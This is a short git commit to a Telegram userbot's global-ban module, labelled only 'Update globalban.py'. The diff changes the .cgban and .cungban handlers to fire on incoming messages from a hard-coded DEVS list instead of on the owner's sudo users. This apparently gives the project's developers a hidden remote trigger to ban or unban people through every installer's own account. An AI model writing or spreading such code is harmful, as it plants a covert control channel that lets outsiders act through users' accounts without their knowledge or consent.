2902f066b5878022d53f58c29b1ffc06ccf850b3
jokokendi <80366713+jokokendi@users.noreply.github.com>
2022-01-27 11:52:32 +0700

    Update globalban.py

--- userbot/modules/globalban.py
+++ userbot/modules/globalban.py
@@ -40,7 +40,7 @@ def mentionuser(name, userid):
 
 
 @man_cmd(pattern="gban(?: |$)(.*)")
-@register(pattern=r"^\.cgban(?: |$)(.*)", sudo=True)
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cgban(?: |$)(.*)")
 async def gban(event):
     if event.fwd_from:
         return
@@ -94,7 +94,7 @@ async def gban(event):
 
 
 @man_cmd(pattern="ungban(?: |$)(.*)")
-@register(pattern=r"^\.cungban(?: |$)(.*)", sudo=True)
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cungban(?: |$)(.*)")
 async def ungban(event):
     if event.fwd_from:
         return
